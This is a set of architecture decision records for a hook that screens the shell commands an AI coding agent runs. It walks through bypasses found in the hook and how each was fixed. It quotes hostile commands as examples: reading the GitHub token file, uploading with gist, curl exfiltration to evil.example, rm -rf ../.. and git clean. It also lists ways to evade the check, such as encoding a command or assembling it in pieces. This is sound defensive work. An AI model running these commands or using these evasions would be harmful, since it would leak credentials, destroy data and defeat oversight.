# Architecture Decision Records (ADRs)

Short notes on the design decisions behind this tool, one per real problem I hit.
The tests enforce these; this is the reasoning.

## 1. The two holes I was sure I'd covered

The first version blocked the obvious secret files: `~/.ssh`, `~/.aws`, `.env`.
Then I had someone try to break it, and the two most valuable stores turned out to
be wide open. `cat ~/.config/gh/hosts.yml` printed my GitHub token, and
`gh gist create <file>` would upload anything I pointed it at, and neither tripped
a single check. The credential-path list didn't know about the GitHub token store,
and a gist upload isn't a "read a secret file" shape at all, it's a network command
wearing an ordinary name.

So the secret-path list now includes the two stores an AI coding agent is most
likely to reach (the GitHub token store and the Claude credentials file), and the
`gh` subcommands that ship data (gist, release upload, a writing api call) are
handled in the network lock, not the file lock.

The lesson stuck: the holes that matter aren't the ones you thought of, they're the
ones an adversary finds. A guard is only as good as the review that tried to beat it.

## 2. A user-agent string is not a destination

The network lock allows a command if it points at a local address. An early version
looked for "localhost" anywhere in the command. That let
`curl -A localhost https://evil.example/upload` straight through: `-A` sets a
user-agent header, and the word "localhost" sitting in that header satisfied a check
that was supposed to describe where the data goes.

So now it pulls the actual host out of the URL and checks only that. A local-sounding
word somewhere else in the command doesn't count.

Small bug, but it's the exact shape of a bypass: satisfy the letter of a check with
something that has nothing to do with its intent. Check the thing you actually care
about, not a stand-in for it.

## 3. Fail open, and never let the agent override

Two decisions that sound backwards until you've run agents in production.

It fails open. A malformed payload, a missing `jq`, any error at all, and the command
is allowed. A guard that blocks everything the moment it breaks is a guard that gets
ripped out the first time it wedges a session. This is a cheap early layer, not the
last line of defense, so a false "allow" when it's broken beats a false "deny" on
everything.

And there's no agent override. Some hooks let the model pass a flag to bypass them;
this one can't be talked out of a block. If a command is legitimately blocked, a
person runs it outside the agent. An override the agent controls is an override a
poisoned instruction controls.

The honest limit, stated plainly: anyone deliberately trying to get around this will.
Encode the command, build it out of pieces at the last second, hide the filename in a
variable, and it goes straight past, because all this does is read the command as text.
It stops honest mistakes and obvious attacks cheaply. The real wall for someone who
means it is an operating system sandbox. This runs in front of one, not instead of one.

## 4. Fixing the false positives opened three new holes

Someone ran about sixty commands through the guard that its tests never covered. Their
verdict was that the design was sound and the rules were where the work was. That turned
out to be right, and not in the way I expected.

It was blocking things people do constantly. `cat docs/design-tokens.md` was refused,
and design tokens are something almost every front-end project has, so anyone doing
interface work would hit it within an hour. A guard that stops you reading your own file
every morning is one you uninstall by lunch. It also refused `curl --help`, a search for
the word `curl` in a folder, and a copy from one place on my own disk to another. None of
those touch a network.

Meanwhile `rm -rf ../..` went straight through. That one matters most, because an agent
runs inside your project folder, so it never needs a full path to destroy your work.

Fixing all that took three changes: letting the secret-file rule stand down when the file
is obviously source code, only treating a network command as a network command when it is
the command being run, and working out what a path like `../..` actually points at. Each
of those was right. Three of them also opened a new hole, and the tests passed over every
one.

The first was the same bug I had already fixed once. The list of allowed destinations was
being checked against the address in the URL rather than the whole command, which was the
fix for `curl -A localhost https://evil.example` sneaking past. But it was still asking
whether the address *contained* something local, so `localhost.evil.example` passed too.
Same mistake, one level down. The change that finally made real local addresses work was
the change that removed the last of the strictness. Now an address either is one of the
allowed names exactly, or ends with one.

The second came from splitting a command into pieces so each part could be judged
separately. It split on curly braces, which broke apart the data attached to a web
request and left the address sitting in a piece with no command in front of it. So
`curl -d '{"tok":"..."}' https://x` had nothing to judge, while the same request written
slightly differently was blocked. Braces never needed splitting.

The third made the new version weaker than the old one. Letting the secret-file rule stand
down for source code also let it stand down for `.txt`, `.sh` and `.sql` files anywhere on
the disk, and those are exactly what someone names a file when they save a password into
one. Now those only get the benefit of the doubt inside the project you are working in,
because a folder called `app` also turns up in paths like `/opt/app/`.

The real lesson is about order, not about any of the rules. The tests were written after
the code, so they could only cover the mistakes I already knew I might make. A test suite
can be entirely green over a hole its author never thought to look for. The sixty commands
that found these problems are part of the suite now, and next time they go first.

## 5. Writing about a dangerous command is not running one

Network commands only count when they are the command being run. That went in early,
because searching a folder for the word `curl` has to keep working. The destructive
commands never got the same treatment, and it showed as soon as I pointed the guard at
its own development. A commit message describing this very fix was refused, because it
contained the name of a disk-formatting command. So was a block of text I was saving to
a file that happened to mention one.

Over a single session this guard blocked four of the commands I was using to improve it,
including the commit that fixed the false alarm it was firing on.

That is not a cosmetic annoyance. A rule that stops you writing about a danger teaches
you to work around the rule, and working around it becomes a habit long before the next
real catch arrives. So the destructive commands are now recognised the same way network
ones are, which also means one hiding behind `sudo` still gets caught.

Doing that was necessary and not enough. `git commit -m "block git clean -xfd"` has
`git` as the command being run, so it still matched the rule about `git clean`, on the
strength of the message text. Git is really a hundred tools behind one name, so the part
that matters is the word after it, and finding that word means stepping over git's own
options first, so `git -C somewhere push --force` still comes out as a push.

The general version: being strict about where a command starts is only as good as your
idea of where it starts. For anything that hides many tools behind one name, the name is
one level too shallow.

One case is left open on purpose. If you save a block of text to a file and one of the
lines begins with a dangerous word, that line is indistinguishable from a real command
unless the guard understands shell syntax properly, and it reads the command as text.
Ignoring saved text entirely would be wrong the other way, because you can feed a block
of text straight into a shell and it will run. The README says so plainly, and asking
`--explain` will name the rule that fired and the exact thing it objected to, so a false
alarm is easy to recognise.
